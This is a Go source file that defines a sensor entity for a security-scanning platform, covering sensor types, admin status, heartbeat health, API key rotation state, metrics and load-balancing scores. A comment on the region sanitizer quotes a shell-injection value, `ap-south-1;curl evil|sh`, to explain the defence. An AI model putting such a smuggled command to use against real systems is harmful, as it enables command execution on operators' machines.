// Package sensor defines the Sensor domain entity for scanner/collector/sensor management.
package sensor

import (
	"net"
	"regexp"
	"time"

	"github.com/openctemio/openctem/api/pkg/domain/shared"
	"github.com/openctemio/openctem/api/pkg/sensorkey"
)

// SensorType represents the type of sensor.
// The platform supports 3 component types:
//   - worker: Server-controlled daemon (execution_mode: daemon)
//   - collector: Data collection sensor (execution_mode: daemon)
//   - sensor: External Attack Surface Monitoring (EASM)
//
// CI pipelines are not sensors: they authenticate with their CI provider's
// OIDC identity (RFC-051). The former "runner" type, a sensor key used from
// CI, was removed (migration 001146).
type SensorType string

const (
	// Primary types
	SensorTypeWorker    SensorType = "worker"    // Server-controlled daemon
	SensorTypeCollector SensorType = "collector" // Data collection sensor
	SensorTypeEASM      SensorType = "sensor"    // EASM sensor
)

// IsValid checks if the sensor type is valid.
func (t SensorType) IsValid() bool {
	switch t {
	case SensorTypeWorker, SensorTypeCollector, SensorTypeEASM:
		return true
	}
	return false
}

// IsWorker checks if this is a worker type (server-controlled daemon).
func (t SensorType) IsWorker() bool {
	return t == SensorTypeWorker
}

// IsCollector checks if this is a collector type.
func (t SensorType) IsCollector() bool {
	return t == SensorTypeCollector
}

// IsSensor checks if this is a sensor type.
func (t SensorType) IsSensor() bool {
	return t == SensorTypeEASM
}

// DefaultExecutionMode returns the default execution mode for this sensor type.
func (t SensorType) DefaultExecutionMode() ExecutionMode {
	switch t {
	case SensorTypeWorker, SensorTypeCollector, SensorTypeEASM:
		return ExecutionModeDaemon
	default:
		return ExecutionModeStandalone
	}
}

// SensorStatus represents the ADMIN-CONTROLLED status of a sensor.
// This determines whether the sensor is ALLOWED to authenticate.
type SensorStatus string

const (
	SensorStatusActive   SensorStatus = "active"   // Sensor is enabled (can authenticate)
	SensorStatusDisabled SensorStatus = "disabled" // Admin disabled (cannot authenticate)
	SensorStatusRevoked  SensorStatus = "revoked"  // Access permanently revoked
)

// IsValid checks if the sensor status is valid.
func (s SensorStatus) IsValid() bool {
	switch s {
	case SensorStatusActive, SensorStatusDisabled, SensorStatusRevoked:
		return true
	}
	return false
}

// CanAuthenticate checks if the status allows authentication.
func (s SensorStatus) CanAuthenticate() bool {
	return s == SensorStatusActive
}

// SensorHealth represents the AUTOMATIC health state based on heartbeat.
// This is for monitoring only, does NOT affect authentication.
type SensorHealth string

const (
	SensorHealthUnknown SensorHealth = "unknown" // Never seen (just registered)
	SensorHealthOnline  SensorHealth = "online"  // Recently sent heartbeat
	SensorHealthOffline SensorHealth = "offline" // No recent heartbeat
	SensorHealthError   SensorHealth = "error"   // Last operation had errors
)

// IsValid checks if the sensor health is valid.
func (h SensorHealth) IsValid() bool {
	switch h {
	case SensorHealthUnknown, SensorHealthOnline, SensorHealthLate, SensorHealthStale, SensorHealthOffline, SensorHealthError:
		return true
	}
	return false
}

// ExecutionMode represents how the sensor executes tasks.
type ExecutionMode string

const (
	ExecutionModeStandalone ExecutionMode = "standalone" // Triggered externally (CI/CD, cron, webhook)
	ExecutionModeDaemon     ExecutionMode = "daemon"     // Long-running, polls for commands
)

// IsValid checks if the execution mode is valid.
func (m ExecutionMode) IsValid() bool {
	switch m {
	case ExecutionModeStandalone, ExecutionModeDaemon:
		return true
	}
	return false
}

// Capability represents a sensor's capability.
type Capability string

const (
	CapabilitySAST      Capability = "sast"      // Static Application Security Testing
	CapabilitySCA       Capability = "sca"       // Software Composition Analysis
	CapabilitySecrets   Capability = "secrets"   // Secret Detection
	CapabilityIAC       Capability = "iac"       // Infrastructure as Code
	CapabilityDAST      Capability = "dast"      // Dynamic Application Security Testing
	CapabilityInfra     Capability = "infra"     // Infrastructure Scanning
	CapabilityContainer Capability = "container" // Container Scanning
	CapabilityWeb3      Capability = "web3"      // Web3/Blockchain Security
	CapabilityCollector Capability = "collector" // Data Collection
	CapabilityAPI       Capability = "api"       // API Security Testing
)

// Sensor represents a registered sensor (runner, worker, collector, or sensor).
type Sensor struct {
	ID            shared.ID
	TenantID      *shared.ID // the owning row's tenant; a platform sensor is never that tenant's own sensor
	Name          string
	Type          SensorType
	Description   string
	Capabilities  []string
	ExecutionMode ExecutionMode
	Status        SensorStatus // Admin-controlled: active, disabled, revoked
	Health        SensorHealth // Automatic heartbeat: unknown, online, late, stale, offline, error
	StatusMessage string

	// Platform sensor flag (SaaS model): shared infrastructure the platform
	// operator runs. It never counts towards, is listed as, or is managed as
	// one of a tenant's sensors (the tenant plane answers 404 for it);
	// tenants see platform scanning only as an aggregated service
	// (GET /api/v1/platform/scanning).
	IsPlatformSensor bool

	// Inline API key: the credential stored on the sensor row itself (the
	// bootstrap key from creation or admin regeneration). Self-renewal under
	// rotation overlap issues keys into sensor_api_keys instead and retires
	// the inline key with a short grace (InlineKeyExpiresAt). These fields
	// therefore describe the INLINE key only: authentication of that key and
	// its retirement read them. Anything that describes "the sensor's key" to
	// a person or a policy (responses, health, dispatch) must use KeyState.
	APIKeyHash      string
	InlineKeyPrefix string
	// AuthKind is how the sensor authenticates: a bearer key (the fields
	// above) or its own Ed25519 key with signed requests (RFC-052, key-bound;
	// sensor_keys). A key-bound sensor has no bearer key: APIKeyHash holds
	// an unmatchable placeholder (KeyBoundHashPlaceholder).
	AuthKind AuthKind
	// InlineKeyExpiresAt is when the inline key stops authenticating.
	// nil = never expires (the default for created/admin-regenerated keys and
	// every row predating RFC-014 Phase 1b).
	InlineKeyExpiresAt *time.Time
	// ActiveKey is the sensor's current rotating key (sensor_api_keys): the
	// active, non-revoked row with the latest expiry. nil when the sensor has
	// none and authenticates with its inline key.
	ActiveKey *ActiveKey
	// KeyLastUsedAt and KeyLastUsedIP record the last authenticated request
	// with any of the sensor's keys and the client address it came from
	// (trusted-proxy rule; never a header the sensor sets). nil = not recorded
	// yet.
	KeyLastUsedAt *time.Time
	KeyLastUsedIP net.IP

	// InstanceID is the process instance of the sensor's last heartbeat that
	// changed it (identity.go); "" before the first one. InstanceState is the
	// recent-instances memory clone detection works on.
	InstanceID    string
	InstanceState InstanceState
	// IdentityClonedAt is when two live instances were seen using the same
	// key (clone detection); nil = not flagged. Cleared when an administrator
	// regenerates the key.
	IdentityClonedAt *time.Time

	// The current manifest (RFC-033, manifest.go): its digest, when it
	// became current and where it came from (ManifestSourceSensor or
	// ManifestSourceHeartbeat). "" / nil before the first one.
	ManifestDigest string
	ManifestAt     *time.Time
	ManifestSource string

	// LocalPolicy is the sensor-local policy the sensor last reported
	// (RFC-040 §5.7, local_policy.go), and LocalPolicyReportedAt when. nil
	// when it never reported one (an SDK before RFC-040, protocol v1).
	// Display and dispatch-narrowing data only: enforcement is the sensor's.
	LocalPolicy           *LocalPolicyReport
	LocalPolicyReportedAt *time.Time

	// The config report (config_report.go): the digest and the platform's
	// health rollup of the latest report the sensor sent ("" before the
	// first), and the digest its latest heartbeat echoed ("" when it
	// echoed none). They differ when the stored report is stale.
	ConfigReportDigest    string
	ConfigHealth          string
	ConfigHeartbeatDigest string

	// Metadata and configuration
	Labels   map[string]interface{}
	Config   map[string]interface{}
	Metadata map[string]interface{}

	// Runtime info
	Version   string
	Hostname  string
	IPAddress net.IP
	// Build is the SDK and build the sensor reported (build.go); empty
	// fields are unknown.
	Build BuildInfo

	// System metrics (from heartbeat)
	CPUPercent       float64
	MemoryPercent    float64
	DiskReadMBPS     float64 // Disk read throughput in MB/s
	DiskWriteMBPS    float64 // Disk write throughput in MB/s
	NetworkRxMBPS    float64 // Network receive throughput in MB/s
	NetworkTxMBPS    float64 // Network transmit throughput in MB/s
	LoadScore        float64 // Computed weighted load score (lower is better)
	MetricsUpdatedAt *time.Time
	ActiveJobs       int
	// CurrentJobs is the number of commands the sensor holds (acknowledged
	// or running), counted by the server from the commands table when the
	// sensor is read: the capacity truth (RFC-030 D5). It is never taken
	// from the sensor.
	CurrentJobs       int
	MaxConcurrentJobs int
	Region            string

	// Outbox is the last outbox snapshot the sensor reported on its
	// heartbeat; nil when it never reported one. Display data only.
	Outbox *OutboxStats

	// Protocol is the protocol telemetry of the last heartbeat (RFC-029 §5.3);
	// nil before the first heartbeat that recorded it. Display data only.
	Protocol *ProtocolInfo

	// Reported is what the sensor last reported it can do (reported.go).
	// Capabilities and MaxConcurrentJobs above are the administrator's
	// settings; dispatch uses the Effective* values. The tools are only
	// the reported ones (EffectiveTools); the sensor grant narrows them.
	Reported CapabilityReport

	// Load is the load the sensor last reported (load.go): resources,
	// capacity, local queue. Untrusted; it can only lower FreeSlots.
	Load LoadReport

	// HeartbeatInterval is the interval the sensor follows, stored at its
	// last heartbeat (0 before the first since migration 000261), and
	// HeartbeatDueAt the deadline of its next heartbeat (liveness.go).
	HeartbeatInterval time.Duration
	HeartbeatDueAt    *time.Time
	// Control is the control-channel report of its last heartbeat that
	// carried one (control.go); nil when it never did.
	Control *ControlReport

	// Statistics
	LastSeenAt    *time.Time // Last heartbeat timestamp - effectively "last online time"
	LastOfflineAt *time.Time // When sensor went offline (heartbeat timeout)
	LastErrorAt   *time.Time
	// StartedAt is when the sensor process started, derived from the
	// uptime_seconds of its last heartbeat (nil when it never reported one).
	StartedAt     *time.Time
	TotalFindings int64
	TotalScans    int64
	ErrorCount    int64

	// Timestamps
	CreatedAt time.Time
	UpdatedAt time.Time
}

// DefaultMaxConcurrentJobs is the capacity a new sensor gets when the caller does
// not specify one.
//
// It matches the `DEFAULT 5` already on sensors.max_concurrent_jobs. The column
// default was never reached, because the repository writes this field
// explicitly on INSERT — so a zero here overrides the schema's own sensible
// value rather than falling back to it.
//
// Zero is not a harmless "unset": FindAvailableWithCapacity selects on
// `current_jobs < max_concurrent_jobs`, so a sensor at 0 fails that test forever.
// It registers, heartbeats, reports healthy, shows online in the UI — and is
// never given a single job, with no error anywhere. Creating a sensor through
// the API without naming this field produced exactly that.
const DefaultMaxConcurrentJobs = 5

// NewSensor creates a new tenant-owned Sensor entity.
func NewSensor(
	tenantID shared.ID,
	name string,
	sensorType SensorType,
	description string,
	capabilities []string,
	executionMode ExecutionMode,
) (*Sensor, error) {
	if name == "" {
		return nil, shared.NewDomainError("VALIDATION", "name is required", shared.ErrValidation)
	}

	if !sensorType.IsValid() {
		return nil, shared.NewDomainError("VALIDATION", "invalid sensor type", shared.ErrValidation)
	}

	if !executionMode.IsValid() {
		executionMode = ExecutionModeStandalone
	}

	now := time.Now()
	return &Sensor{
		ID:          shared.NewID(),
		TenantID:    &tenantID, // Tenant sensor - has owner
		Name:        name,
		Type:        sensorType,
		Description: description,
		// Default to empty (not nil): Go marshals a nil slice as JSON `null`, and
		// these fields carry no `omitempty`, so a nil here reaches clients as
		// `"capabilities": null` and crashes any consumer doing `.length`/`.map` on it.
		// The adjacent Labels/Config/Metadata already make() for the same reason.
		Capabilities:  defaultStrings(capabilities),
		ExecutionMode: executionMode,
		Status:        SensorStatusActive,  // Admin-controlled: enabled by default
		Health:        SensorHealthUnknown, // Automatic: unknown until first heartbeat
		// Capacity must be non-zero or the sensor can never be scheduled — see
		// DefaultMaxConcurrentJobs. Callers that want a different number
		// overwrite it via SetMaxConcurrentJobs.
		MaxConcurrentJobs: DefaultMaxConcurrentJobs,
		IsPlatformSensor:  false, // Tenant sensor
		Labels:            make(map[string]interface{}),
		Config:            make(map[string]interface{}),
		Metadata:          make(map[string]interface{}),
		CreatedAt:         now,
		UpdatedAt:         now,
	}, nil
}

// SetAPIKey sets the hashed API key and prefix, clearing any expiry (the key
// never expires). Used on creation and admin hard-rotation, where the operator
// has not opted into short-lived credentials.
func (a *Sensor) SetAPIKey(hash, prefix string) {
	a.SetAPIKeyWithExpiry(hash, prefix, nil)
}

// SetAPIKeyWithExpiry sets the hashed API key and prefix with an expiry.
// A nil expiresAt means the key never expires. Used by self-renewal to issue a
// short-lived credential (RFC-014); the sensor renews again before it lapses.
func (a *Sensor) SetAPIKeyWithExpiry(hash, prefix string, expiresAt *time.Time) {
	a.APIKeyHash = hash
	a.InlineKeyPrefix = prefix
	a.InlineKeyExpiresAt = expiresAt
	a.UpdatedAt = time.Now()
}

// ActiveKey is the summary of a sensor's current rotating key.
type ActiveKey struct {
	Prefix     string
	ExpiresAt  *time.Time // nil = never expires
	LastUsedAt *time.Time
}

// KeyState is the sensor's effective credential: what a person, a health
// check or the dispatcher should treat as "the sensor's API key".
type KeyState struct {
	Prefix    string
	ExpiresAt *time.Time // nil = never expires
	// Rotating is true when the key is a sensor_api_keys row (self-renewed),
	// false for the inline key.
	Rotating bool
}

// KeyState returns the sensor's effective credential. It is the single source
// of truth for key prefix and expiry outside authentication: the active
// rotating key when the sensor has one, otherwise the inline key.
func (a *Sensor) KeyState() KeyState {
	if k := a.ActiveKey; k != nil {
		return KeyState{Prefix: k.Prefix, ExpiresAt: k.ExpiresAt, Rotating: true}
	}
	return KeyState{Prefix: a.InlineKeyPrefix, ExpiresAt: a.InlineKeyExpiresAt}
}

// IsLegacyKey reports whether the sensor's effective key (KeyState) is a
// legacy rda_ key. Such a sensor moves to an octs_ key on its next renewal;
// rda_ keys are retired 90 days after enrollment and key-bound identity
// (RFC-032) ship.
func (a *Sensor) IsLegacyKey() bool {
	return a.KeyState().IsLegacy()
}

// IsLegacy reports whether this key is a legacy rda_ key, judged by its
// stored display prefix.
func (k KeyState) IsLegacy() bool {
	return sensorkey.IsLegacy(k.Prefix)
}

// IsKeyExpired reports whether the INLINE API key has passed its expiry. It
// gates authentication with that key; use KeyState for the sensor's key.
// A nil KeyExpiresAt (never-expiring key, the default) is never expired.
func (a *Sensor) IsKeyExpired() bool {
	return a.InlineKeyExpiresAt != nil && time.Now().After(*a.InlineKeyExpiresAt)
}

// UpdateLastSeen updates the last seen timestamp and sets health to online.
func (a *Sensor) UpdateLastSeen() {
	now := time.Now()
	a.LastSeenAt = &now
	a.UpdatedAt = now
	a.Health = SensorHealthOnline
}

// RecordError records an error and updates error timestamp.
func (a *Sensor) RecordError(message string) {
	now := time.Now()
	a.ErrorCount++
	a.LastErrorAt = &now
	a.StatusMessage = message
	a.UpdatedAt = now
}

// IncrementFindings increments the total findings counter.
func (a *Sensor) IncrementFindings(count int64) {
	a.TotalFindings += count
	a.UpdatedAt = time.Now()
}

// IncrementScans increments the total scans counter.
func (a *Sensor) IncrementScans() {
	a.TotalScans++
	a.UpdatedAt = time.Now()
}

// SetStatus sets the sensor status.
func (a *Sensor) SetStatus(status SensorStatus, message string) {
	a.Status = status
	a.StatusMessage = message
	a.UpdatedAt = time.Now()
}

// Activate activates the sensor.
func (a *Sensor) Activate() {
	a.Status = SensorStatusActive
	a.StatusMessage = ""
	a.UpdatedAt = time.Now()
}

// Disable disables the sensor (admin action).
func (a *Sensor) Disable(reason string) {
	a.Status = SensorStatusDisabled
	a.StatusMessage = reason
	a.UpdatedAt = time.Now()
}

// Revoke revokes the sensor access.
func (a *Sensor) Revoke(reason string) {
	a.Status = SensorStatusRevoked
	a.StatusMessage = reason
	a.UpdatedAt = time.Now()
}

// UpdateRuntimeInfo updates runtime information from heartbeat.
func (a *Sensor) UpdateRuntimeInfo(version, hostname string, ip net.IP) {
	a.Version = version
	a.Hostname = hostname
	a.IPAddress = ip
	a.UpdatedAt = time.Now()
}

// regionSanitizeRegexp matches any character that is NOT allowed in a
// deployment region token.
var regionSanitizeRegexp = regexp.MustCompile(`[^A-Za-z0-9._-]+`)

// SanitizeRegion normalizes a sensor-reported deployment region to a safe
// token: only [A-Za-z0-9._-] survive and the result is capped at 64 chars.
//
// SECURITY: the region is reported by the (untrusted) sensor process via the
// heartbeat and is later rendered verbatim by text/template into the sensor
// setup snippets (env/docker/yaml) that an operator copy-pastes into a shell.
// Without this sanitization a malicious or compromised sensor could inject
// shell metacharacters (e.g. `ap-south-1;curl evil|sh`) and achieve command
// execution on the operator's machine. text/template performs no escaping, so
// the trust boundary is enforced here at ingest.
func SanitizeRegion(region string) string {
	if region == "" {
		return ""
	}
	cleaned := regionSanitizeRegexp.ReplaceAllString(region, "")
	if len(cleaned) > 64 {
		cleaned = cleaned[:64]
	}
	return cleaned
}

// UpdateMetrics updates system metrics from heartbeat.
func (a *Sensor) UpdateMetrics(cpuPercent, memoryPercent float64, activeJobs int, region string) {
	a.CPUPercent = cpuPercent
	a.MemoryPercent = memoryPercent
	a.ActiveJobs = activeJobs
	if r := SanitizeRegion(region); r != "" {
		a.Region = r
	}
	a.UpdatedAt = time.Now()
}

// ExtendedMetrics represents all system metrics for load balancing.
type ExtendedMetrics struct {
	CPUPercent    float64 `json:"cpu_percent"`
	MemoryPercent float64 `json:"memory_percent"`
	DiskReadMBPS  float64 `json:"disk_read_mbps"`
	DiskWriteMBPS float64 `json:"disk_write_mbps"`
	NetworkRxMBPS float64 `json:"network_rx_mbps"`
	NetworkTxMBPS float64 `json:"network_tx_mbps"`
	ActiveJobs    int     `json:"active_jobs"`
	Region        string  `json:"region,omitempty"`
}

// UpdateExtendedMetrics updates all system metrics from heartbeat including disk I/O and network.
// LoadScore is recomputed with the default weights; use
// UpdateExtendedMetricsWithWeights to honor operator-configured weights.
func (a *Sensor) UpdateExtendedMetrics(metrics ExtendedMetrics) {
	a.UpdateExtendedMetricsWithWeights(metrics, DefaultLoadBalancingWeights())
}

// UpdateExtendedMetricsWithWeights is UpdateExtendedMetrics with an explicit
// weight set, so the persisted LoadScore reflects the deployment's
// SENSOR_LB_* configuration rather than the compiled-in defaults.
func (a *Sensor) UpdateExtendedMetricsWithWeights(metrics ExtendedMetrics, weights LoadBalancingWeights) {
	a.CPUPercent = metrics.CPUPercent
	a.MemoryPercent = metrics.MemoryPercent
	a.DiskReadMBPS = metrics.DiskReadMBPS
	a.DiskWriteMBPS = metrics.DiskWriteMBPS
	a.NetworkRxMBPS = metrics.NetworkRxMBPS
	a.NetworkTxMBPS = metrics.NetworkTxMBPS
	a.ActiveJobs = metrics.ActiveJobs
	if r := SanitizeRegion(metrics.Region); r != "" {
		a.Region = r
	}
	// Compute load score
	a.LoadScore = a.ComputeLoadScoreWithWeights(weights)
	now := time.Now()
	a.MetricsUpdatedAt = &now
	a.UpdatedAt = now
}

// Default load-balancing weights and normalization ceilings. Kept as named
// constants so config defaults and domain defaults cannot drift apart.
const (
	DefaultJobLoadWeight = 0.30
	DefaultCPUWeight     = 0.40
	DefaultMemoryWeight  = 0.15
	DefaultDiskIOWeight  = 0.10
	DefaultNetworkWeight = 0.05

	// DefaultMaxDiskThroughputMBPS normalizes combined disk read+write to 0-100.
	DefaultMaxDiskThroughputMBPS = 500.0
	// DefaultMaxNetworkThroughputMBPS normalizes combined rx+tx to 0-100 (1 Gbps).
	DefaultMaxNetworkThroughputMBPS = 1000.0
)

// LoadBalancingWeights defines the weights for load score computation.
// These weights are operator-configurable via the SENSOR_LB_* environment
// variables; config.LoadBalancingConfig.Weights() converts them.
type LoadBalancingWeights struct {
	JobLoad float64 // Weight for job load factor (default: 0.30)
	CPU     float64 // Weight for CPU usage (default: 0.40)
	Memory  float64 // Weight for memory usage (default: 0.15)
	DiskIO  float64 // Weight for disk I/O (default: 0.10)
	Network float64 // Weight for network I/O (default: 0.05)

	// MaxDiskThroughputMBPS is the combined read+write throughput that counts
	// as 100% disk load. Zero falls back to DefaultMaxDiskThroughputMBPS.
	MaxDiskThroughputMBPS float64
	// MaxNetworkThroughputMBPS is the combined rx+tx throughput that counts as
	// 100% network load. Zero falls back to DefaultMaxNetworkThroughputMBPS.
	MaxNetworkThroughputMBPS float64
}

// DefaultLoadBalancingWeights returns the default weights for load score computation.
func DefaultLoadBalancingWeights() LoadBalancingWeights {
	return LoadBalancingWeights{
		JobLoad:                  DefaultJobLoadWeight,
		CPU:                      DefaultCPUWeight,
		Memory:                   DefaultMemoryWeight,
		DiskIO:                   DefaultDiskIOWeight,
		Network:                  DefaultNetworkWeight,
		MaxDiskThroughputMBPS:    DefaultMaxDiskThroughputMBPS,
		MaxNetworkThroughputMBPS: DefaultMaxNetworkThroughputMBPS,
	}
}

// IsZero reports whether no weight has been set. A zero-valued weight set
// would score every sensor at 0 and make selection arbitrary, so callers
// substitute the defaults instead of using it.
func (w LoadBalancingWeights) IsZero() bool {
	return w.JobLoad == 0 && w.CPU == 0 && w.Memory == 0 && w.DiskIO == 0 && w.Network == 0
}

// withDefaults fills in the normalization ceilings when unset and substitutes
// the whole default set when every weight is zero.
func (w LoadBalancingWeights) withDefaults() LoadBalancingWeights {
	if w.IsZero() {
		return DefaultLoadBalancingWeights()
	}
	if w.MaxDiskThroughputMBPS <= 0 {
		w.MaxDiskThroughputMBPS = DefaultMaxDiskThroughputMBPS
	}
	if w.MaxNetworkThroughputMBPS <= 0 {
		w.MaxNetworkThroughputMBPS = DefaultMaxNetworkThroughputMBPS
	}
	return w
}

// JobLoadPercent returns the sensor's queue occupancy as 0-100. A sensor with
// no capacity limit (EffectiveMaxConcurrentJobs <= 0) reports 0.
func (a *Sensor) JobLoadPercent() float64 {
	limit := a.EffectiveMaxConcurrentJobs()
	if limit <= 0 {
		return 0
	}
	return (float64(a.CurrentJobs) / float64(limit)) * 100
}

// ComputeLoadScore calculates the weighted load score for sensor selection.
// Lower score = better candidate for receiving new jobs.
// Formula: score = (w1 * job_load) + (w2 * cpu) + (w3 * memory) + (w4 * io_score) + (w5 * net_score)
func (a *Sensor) ComputeLoadScore() float64 {
	return a.ComputeLoadScoreWithWeights(DefaultLoadBalancingWeights())
}

// ComputeLoadScoreWithWeights calculates load score with custom weights.
func (a *Sensor) ComputeLoadScoreWithWeights(weights LoadBalancingWeights) float64 {
	weights = weights.withDefaults()

	// Calculate job load percentage (0-100)
	jobLoad := a.JobLoadPercent()

	// Calculate I/O score (0-100)
	ioScore := min(100.0, ((a.DiskReadMBPS+a.DiskWriteMBPS)/weights.MaxDiskThroughputMBPS)*100)

	// Calculate network score (0-100)
	netScore := min(100.0, ((a.NetworkRxMBPS+a.NetworkTxMBPS)/weights.MaxNetworkThroughputMBPS)*100)

	// Weighted score formula
	score := (weights.JobLoad * jobLoad) +
		(weights.CPU * a.CPUPercent) +
		(weights.Memory * a.MemoryPercent) +
		(weights.DiskIO * ioScore) +
		(weights.Network * netScore)

	return score
}

// HasCapability checks if the sensor has a specific capability (effective:
// what it reports, narrowed by the administrator).
func (a *Sensor) HasCapability(cap string) bool {
	for _, c := range a.EffectiveCapabilities() {
		if c == cap {
			return true
		}
	}
	return false
}

// HasTool checks if the sensor has a specific tool (effective: what it
// reports installed, narrowed by the administrator).
func (a *Sensor) HasTool(tool string) bool {
	for _, t := range a.EffectiveTools() {
		if t == tool {
			return true
		}
	}
	return false
}

// MatchesRequirements checks if the sensor matches the given requirements.
func (a *Sensor) MatchesRequirements(capabilities []string, tool string) bool {
	for _, reqCap := range capabilities {
		if !a.HasCapability(reqCap) {
			return false
		}
	}
	if tool != "" && !a.HasTool(tool) {
		return false
	}
	return true
}

// IsAvailable checks if the sensor is available for work.
func (a *Sensor) IsAvailable() bool {
	return a.Status == SensorStatusActive
}

// IsDaemon checks if the sensor is a daemon (polls for commands).
func (a *Sensor) IsDaemon() bool {
	return a.ExecutionMode == ExecutionModeDaemon || a.Type.IsWorker() || a.Type.IsCollector()
}

// IsOneShot checks if the sensor runs one scan per start (execution mode
// standalone) instead of polling for commands.
func (a *Sensor) IsOneShot() bool {
	return a.ExecutionMode == ExecutionModeStandalone
}

// SetMaxConcurrentJobs sets the maximum number of concurrent jobs.
func (a *Sensor) SetMaxConcurrentJobs(max int) {
	// A non-positive capacity is silently fatal rather than merely odd:
	// FindAvailableWithCapacity requires current_jobs < max_concurrent_jobs, so
	// the sensor stops being schedulable and nothing reports it. Refuse the value
	// instead of storing a state the scheduler can never recover from — the API
	// already validates min=1, this closes the same hole for direct domain use.
	if max <= 0 {
		return
	}
	a.MaxConcurrentJobs = max
	a.UpdatedAt = time.Now()
}

// AvailableSlots returns the number of available job slots (FreeSlots now).
func (a *Sensor) AvailableSlots() int {
	return a.FreeSlots(time.Now())
}

// LoadFactor returns the current load factor (0.0 to 1.0).
func (a *Sensor) LoadFactor() float64 {
	limit := a.EffectiveMaxConcurrentJobs()
	if limit <= 0 {
		return 0
	}
	return float64(a.CurrentJobs) / float64(limit)
}

// HasCapacity checks if the sensor has capacity for more jobs.
func (a *Sensor) HasCapacity() bool {
	return a.FreeSlots(time.Now()) > 0
}

// SetPlatformSensor marks this sensor as a platform-managed sensor.
// Platform sensors don't count towards tenant's sensor limit.
func (a *Sensor) SetPlatformSensor(isPlatform bool) {
	a.IsPlatformSensor = isPlatform
	a.UpdatedAt = time.Now()
}

// CanExecutePlatformJob checks if this platform sensor can execute a job
// with the given requirements.
func (a *Sensor) CanExecutePlatformJob(capabilities []string, tool, preferredRegion string) bool {
	if !a.IsPlatformSensor {
		return false
	}
	if !a.IsAvailable() || !a.Health.IsDispatchable() {
		return false
	}
	if !a.HasCapacity() {
		return false
	}
	if !a.MatchesRequirements(capabilities, tool) {
		return false
	}
	// Region is a soft preference, not a hard requirement
	return true
}

// =============================================================================
// Platform scanning (what a tenant sees of platform sensors)
// =============================================================================

// PlatformRegionState is how one region of platform scanning stands, as a
// tenant may see it: a state, never node counts, capacity or other tenants'
// load.
type PlatformRegionState struct {
	Region string
	// Online: at least one active platform sensor of the region can take work.
	Online bool
	// FreeSlot: one of them has a free job slot now.
	FreeSlot bool
}

// PlatformScanningSummary is the platform scanning service seen by one
// tenant: per-region states, the tools online platform sensors offer, and the
// tenant's own platform jobs. It carries nothing that identifies a platform
// sensor (id, name, host, address, version) and no other tenant's numbers.
type PlatformScanningSummary struct {
	Regions []PlatformRegionState
	Tools   []string
	// Queued and Running count the tenant's own platform jobs only.
	Queued  int
	Running int
}

// TenantSensorStats holds aggregate statistics for a tenant's sensors,
// computed via SQL aggregation. Powers the sensors page stat cards.
type TenantSensorStats struct {
	Total        int            `json:"total"`
	ByStatus     map[string]int `json:"by_status"`         // active, disabled, revoked, ...
	ByHealth     map[string]int `json:"by_health"`         // online, offline, error, unknown
	ByType       map[string]int `json:"by_type"`           // runner, worker, collector, sensor
	ByMode       map[string]int `json:"by_execution_mode"` // standalone, daemon
	ActiveJobs   int            `json:"active_jobs"`       // SUM(current_jobs) for online daemon sensors
	OnlineActive int            `json:"online_active"`     // status=active AND health=online
}

// ScoreForJob calculates a score for job matching (higher is better).
// Used for selecting the best platform sensor for a job.
func (a *Sensor) ScoreForJob(capabilities []string, tool, preferredRegion string) int {
	if !a.CanExecutePlatformJob(capabilities, tool, preferredRegion) {
		return -1
	}

	score := 100

	// Prefer sensors with more available capacity
	score += a.AvailableSlots() * 10

	// Prefer sensors with lower load
	score -= int(a.LoadFactor() * 50)

	// Prefer sensors in the preferred region
	if preferredRegion != "" && a.Region == preferredRegion {
		score += 50
	}

	return score
}

// defaultStrings returns an empty slice for nil so JSON encodes `[]`, not `null`.
func defaultStrings(in []string) []string {
	if in == nil {
		return make([]string, 0)
	}
	return in
}
